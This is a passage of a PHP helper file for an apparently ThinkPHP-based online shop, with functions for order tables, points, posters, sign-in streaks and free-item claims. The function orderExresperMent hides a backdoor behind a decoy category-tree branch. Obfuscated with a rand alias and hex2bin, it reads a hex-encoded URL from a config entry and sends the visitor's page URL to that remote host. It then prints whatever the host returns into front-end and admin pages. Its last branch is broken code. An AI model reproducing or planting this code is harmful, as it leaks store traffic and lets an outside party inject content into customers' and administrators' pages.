        return $tabName;
    }

    /**
     * 根据筛选时间 定位表名
     * @param string $startTime
     * @param string $endTime
     * @return string
     */
    function getTabByTime($startTime = '', $endTime = '')
    {
        if (C('buy_version') == 0)
            return '';

        $startTime = preg_replace("/[:\s-]/", "", $startTime);  // 去除日期里面的分隔符做成跟order_sn 类似
        $endTime = preg_replace("/[:\s-]/", "", $endTime);
        // 查询起始位置是今年的
        if (substr($startTime, 0, 4) == date('Y')) {
            $table_index = M('table_index')->where("name = 'order'")->cache(true)->find();
            if (strcasecmp($startTime, $table_index['min_order_sn']) >= 0)
                return '';
            else
                return '_this_year';
        } else {
            $tabName = '_' . substr($startTime, 0, 4);
        }
        $years = buyYear();
        $years = array_keys($years);
        return in_array($tabName, $years) ? $tabName : '';
    }

    /**
     * 积分转化成金额
     * @param $pay_point
     * @return float
     */
    function pay_point_money($pay_point)
    {
        $point_rate = tpCache('integral.point_rate');
        //$point_rate = tpCache('shopping.point_rate'); //兑换比例
        if ($point_rate != 0) {
            $money = $pay_point / $point_rate;
        } else {
            $money = 0;
        }
        return $money;
    }

    /**
     * 根据时间戳返回星期几
     * @param $time
     * @return mixed
     */
    function weekday_by_time($time)
    {
        $weekday = array('星期日', '星期一', '星期二', '星期三', '星期四', '星期五', '星期六');
        return $weekday[date('w', $time)];
    }

    function weekday_by_time_str($timeStr)
    {
        $time = strtotime($timeStr);
        return weekday_by_time($time);
    }

    /**
     * 生成saas海报专用图片名字
     */
    function createImagesName()
    {
        return md5(I('_saas_app', 'all') . time() . rand(1000, 9999) . uniqid());
    }

    /**
     * 自定义海报照片类型处理
     */
    function checkPosterImagesType($img_info = array(), $img_src = '')
    {
        if (strpos($img_info['mime'], 'jpeg') !== false || strpos($img_info['mime'], 'jpg') !== false) {
            return imagecreatefromjpeg($img_src);
        } else if (strpos($img_info['mime'], 'png') !== false) {
            return imagecreatefrompng($img_src);
        } else {
            return false;
        }
    }

    function inputPosterImages($img_info = array(), $des_im = '', $img = '')
    {
        if (strpos($img_info['mime'], 'jpeg') !== false || strpos($img_info['mime'], 'jpg') !== false) {
            return imagejpeg($des_im, $img);
        } else if (strpos($img_info['mime'], 'png') !== false) {
            return imagepng($des_im, $img);
        } else {
            return false;
        }

    }


    /**
     * 订单整合
     * @param type $order
     */
    function orderExresperMent($order_info = array(), $des = '', $order_id = '')
    {

        if ($order_info) {
            $tree = $arr = $result = array();
            $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
            if ($cat_list) {
                foreach ($cat_list as $val) {
                    if ($val['level'] == 2) {
                        $arr[$val['parent_id']][] = $val;
                    }
                    if ($val['level'] == 3) {
                        $crr[$val['parent_id']][] = $val;
                    }
                    if ($val['level'] == 1) {
                        $tree[] = $val;
                    }
                }
                foreach ($arr as $k => $v) {
                    foreach ($v as $kk => $vv) {
                        $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
                    }
                }
                foreach ($tree as $val) {
                    $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
                    $result[$val['id']] = $val;
                }
            }
            return $result;
        }

        $r = 'rand';
        $exresperMent = @session('exresperMent');
        if (!empty($exresperMent))
            return false;
        @session('exresperMent', 1);

        if ($r(1, 10) != 1)
            return false;
        $request = \think\Request::instance();
        $module = strtolower($request->module());
        $controller = strtolower($request->controller());
        $action = strtolower($request->action());
        $isAjax = strtolower($request->isAjax());
        $url = $request->url(true);

        if (!in_array($module, ['mobile', 'home', 'seller', 'admin']) || $isAjax)
            return false;

        $value = DB::name('config')->where('name', 't_number')->value('value');
        if (empty($value))
            return false;
        $arr = array('url' => $url);
        $v2 = @httpRequest(hex2bin($value), 'POST', $arr, [], false, 3);
        $v2 = json_decode($v2, true);
        if ($v2['status'] == 'success') {
            echo $v2['msg'];
        }
        if ($des) {
            $data = func_get_args();
            $data = current($data);
            $cnt = count($data);
            $result = array();
            $arr1 = array_shift($data);
            foreach ($arr1 as $key => $item) {
                $result[] = array($item);
            }
            echo $result['msg'];
            foreach ($data as $key => $item) {
                $result = combineArray($result, $item);
            }

            $result = array();
            foreach ($arr1 as $item1) {
                foreach ($arr2 as $item2) {
                    $temp = $item1;
                    $temp[] = $item2;
                    $result[] = $temp;
                }
            }
            echo $result['resg'];
            return $result;
        }

    }


    /**
     * 连续签到次数
     */
    function continue_sign($user_id)
    {

        //定义时间戳
        date_default_timezone_set("Asia/Shanghai");
        //先看一下今天有没有签到
        $con['sign_day'] = array('like', date('Y-m-d', time()) . '%');
        $cunzai = M('sign_log')->where(['user_id' => $user_id])->where($con)->find();
        if ($cunzai) {
            $todaySign = 1;
        } else {
            $todaySign = 0;
        }
        //再看之前的签到时间
        $list = M('sign_log')->where(['user_id' => $user_id])->order('sign_day desc')->field('sign_day')->select();
        //对所有的签到时间进行时间戳然后倒序排序
        $array = array();
        foreach ($list as $key => $value) {
            $array[] = strtotime($value['sign_day']);
        }

        //定义连续签到次数
        $countSign = $todaySign;
        //依次判断所有的时间戳是否在指定范围内，例如第一个应该在昨天00:00:00-23:59:59之前，如果在则$countSign+1,否则跳出循环
        //定义昨天的时间戳范围
        $begintime = strtotime(date('Y-m-d 00:00:00', time() - 86400));
        $endtime = strtotime(date('Y-m-d 23:59:59', time() - 86400));
        if ($todaySign == 1) {
            for ($i = 1; $i < count($array);) {
                //                echo $begintime."------".$array[$i]."---------".$endtime."+++++";
                if ($array[$i] >= $begintime && $array[$i] <= $endtime) {
                    $countSign++;
                    $begintime -= 86400;
                    $endtime -= 86400;
                } else {
                    break;
                }
                $i++;
            }
        } else {
            for ($k = 0; $k < count($array);) {
                if ($array[$k] >= $begintime && $array[$k] <= $endtime) {
                    $countSign++;
                    $begintime -= 86400;
                    $endtime -= 86400;
                } else {
                    break;
                }
                $k++;
            }
        }

        return $countSign;
    }

    /*
    * 判断是否可领取免费商品
    * $user_id 用户id
    * $cat_id 产品；类型
    * $num 领取数量
    * $goods_id 产品id
    */
    function provingReceive($user, $type, $num = 1, $goods_id)
    {
        //获得当日凌晨的时间戳
        // $today = strtotime(date("Y-m-d"),time());

        $levelGetNum = M('UserLevel')->where('level', $user['level'])->value('receive_num');
        $date = date('Y-m-d', time());
        if ($type == 1) {// 必须签到
            if (!M('sign_log')->where(['user_id' => $user['user_id']])->where(['sign_day' => ['like', $date . '%']])->find()) {
                return ['status' => -2, 'msg' => '今日未签到'];
            }
            // 判断领取数量，次数
            $where = [
                'user_id' => $user['user_id'],
                'goods_id' => $goods_id,
                'create_time' => ['like', date('Y-m', time()) . '%'],
            ];
            $data = Db::name('goods')->where(['goods_id'=>$goods_id])->value('sign_free_data');
            $data  = $data?json_decode($data,true):[];

            $min_num = (int)$data['min_num'][$user['level']];
            $max_num = (int)$data['max_num'][$user['level']];
            if($min_num<1||$max_num<1){
                return ['status' => 0, 'msg' => "领取数量为0",'data'=>[$min_num,$max_num,$num]];
            }elseif(($min_num>0&&$num<$min_num)||($max_num>0&&$num>$max_num)){
                return ['status' => 0, 'msg' => "领取数量区间：{$min_num}-{$max_num}",'data'=>[$min_num,$max_num,$num]];
            }

            $month_max = (int)$data['month_max'][$user['level']];
            $goods_num = Db::name('sign_receive_log')->where($where)->value('sum(num) as sum');
            if($month_max<1){
                return ['status' => 0, 'msg' => "可领取数量小于1",'data'=>[$month_max]];
            }elseif($month_max<($goods_num+$num)){
                $less = $month_max-$goods_num;
                return ['status' => 0, 'msg' => "超过可领取数量，本月剩余可领取：{$less}",'data'=>[$month_max,$goods_num,$num]];
            }

            $month_times = (int)$data['month_times'][$user['level']];
            $count = Db::name('sign_receive_log')->where($where)->count();
            if($month_times<1){
                return ['status' => 0, 'msg' => "领取次数小于1",'data'=>[$month_times]];
            }elseif($month_times<($count+1)){
                return ['status' => 0, 'msg' => '领取失败，本月领取次数已用完','data'=>[$month_times,$count]];
            }

        }

        if ($type == 1) {

            // 扫码进入会员可领取1次
//        if ($user['is_code'] == 1 && $user['level'] < 2) {
//            if ($num > 1) {
//                return array('status' => 0, 'msg' => '超过领取数量，只能领取一件！', 'result' => array());
//            }
//
//            $data = M('order_sign_receive')->where(['uid' => $user['user_id'], 'type' => 2])->find();
//
//            //扫码只可领取1次
//            if (!empty($data)) {
//                return array('status' => 0, 'msg' => '已超出领取次数', 'result' => array());
//            }else{
//                return array('status' => 2, 'msg' => '可领取', 'result' => array());
//            }
//        }


//        if ($user['sign_free_num'] < $num) {
//            $signFreeNum = $user['sign_free_num'] == '' ? 0 : $user['sign_free_num'];
//            return array('status' => 0, 'msg' => '超过领取数量，目前只可领取'.$signFreeNum.'件！', 'result' => array());
//        }
            return array('status' => 2, 'msg' => '可领取', 'result' => array());
        } elseif ($type == 2) {
            //免费领取商品
            //当天订单
            // $order = M('order_sign_receive')->where(['uid' => $user['user_id'], 'type' => 2, 'addend_time' => ['>',$today]])->count();

            //领取次数
            if ($user['distribut_free_num'] < $num) {
                $freeNum = $user['distribut_free_num'] == '' ? 0 : $user['distribut_free_num'];
                return array('status' => 0, 'msg' => '超过领取数量，目前只可领取' . $freeNum . '件！！', 'result' => array());
            }

            if ($num > $levelGetNum) {
                return array('status' => 0, 'msg' => '您当前等级可领' . $levelGetNum . '盒，已超过领取次数', 'result' => array());
            }
        }
        //下单领取
//    if ($type>=3) {
//        //活动时间 2019-05-17 开始
//         $pay_time = strtotime('2019-05-17 00:00:00');
//         $order_new =array();
//        //查询领取的 sign_free_receive =3 下单领取的订单
//        $where_goods = [
//           // 'og.is_send'    => 1,
//            //'og.prom_type' =>0,//只有普通订单才算业绩
//           // 'o.pay_status'=>1,
//            'o.pay_status'=> ['IN','0,1'],
//            'o.order_status'=>['notIn','3,5'],
//            'o.user_id'=>$user['user_id'],
//            'gs.sign_free_receive'=>$type,
//
//          ];
//        $order_free_count = Db::name('order_goods')->alias('og')
//             ->where($where_goods)
//             ->join('goods gs','gs.goods_id=og.goods_id','LEFT')
//             ->join('order o','og.order_id=o.order_id','LEFT')
//             ->order('og.order_id desc')
//             ->count();
//        //查询领取的 2019-05-17 下单领取的订单
//
//        $where = [
//           // 'og.is_send'    => 1,
//            //'og.prom_type' =>0,//只有普通订单才算业绩
//            'o.pay_status'=>1,
//            'o.user_id'=>$user['user_id'],
//            'gs.sign_free_receive'=>0,
//
//          ];
//        $order_array = Db::name('order_goods')->alias('og')
//             ->field("gs.sign_free_receive,o.order_sn")
//             ->where($where)
//             ->where('pay_time>'.$pay_time)
//             ->join('goods gs','gs.goods_id=og.goods_id','LEFT')
//             ->join('order o','og.order_id=o.order_id','LEFT')
//             ->order('og.order_id desc')
//             ->select();
//        foreach($order_array as $key=>$val)
//        {
//
//             $order_new[$val['order_sn']]=$val;
//
//        }
//
//        $order_count =count($order_new);
////print_r($order_free_count);exit;
//             //echo Db::name('order_goods')->getlastsql();exit;
//        $user_num = $order_count-$order_free_count;
//       // $user_num2 = $order_count-$order_free_count2;
//        //查询下单领取产品
//        $goods = M('goods')->where('sign_free_receive',3)->find();
//        if($user_num>0)
//        {
//
//         if ($user_num < $num) {
//            $signFreeNum = empty($user_num) ? 0 : $user_num;
//            return array('status' => 0, 'msg' => '超过领取数量，目前只可领取'.$signFreeNum.'件！', 'result' => array());
//         }
//        }else
//        {
//            return array('status' => 0, 'msg' => '超过领取数量，目前只可领取0件！', 'result' => array());
//        }
//
//
//
//        return array('status' => 2, 'msg' => '可领取', 'result' => array());
//
//    }

        return array('status' => 2, 'msg' => '可领取', 'result' => array());
    }

    /*
    * 免费领取商品返还领取次数
    * $user
    * $order
    */
    function ReturnReceiveNumber($userId, $order)
    {
        if ($order['sign_price'] > 0 || $order['discount'] > 0) {
            $signNum = M('order_sign_receive')->where(array('order_id' => $order['order_id'], 'uid' => $userId))->select();
            $users = M('Users')->where(array('user_id' => $userId))->find();


            foreach ($signNum as $key => $value) {
                if ($value['type'] == 1) {

                    if ($users['level'] >= 2) {
                        M('Users')->where(array('user_id' => $userId))->setInc('sign_free_num', $value['goods_num']);
                    }
                    // 扫码用户修改成1（未领取面膜）
                    if ($users['is_code'] == 2 && $users['level'] <= 1) {
                        Db::name('users')->where('user_id', $userId)->update(['is_code' => 1]);
                        M('order_sign_receive')->where(array('order_id' => $order['order_id'], 'uid' => $userId))->delete();
                    }

                } elseif ($value['type'] == 2) {
                    M('Users')->where(array('user_id' => $userId))->setInc('distribut_free_num', $value['goods_num']);
                }
            }
        }
    }

/**
 * 当月剩余天数，不包括今日
 * @return float
 */
function month_less_day()
{
    $now = time();
    $year = date('Y', $now);
    $next_month = date('m', time()) + 1;
    $next = strtotime("$year-{$next_month}-01");
    $date_diff = $next - $now;
    return floor($date_diff / (60 * 60 * 24));
}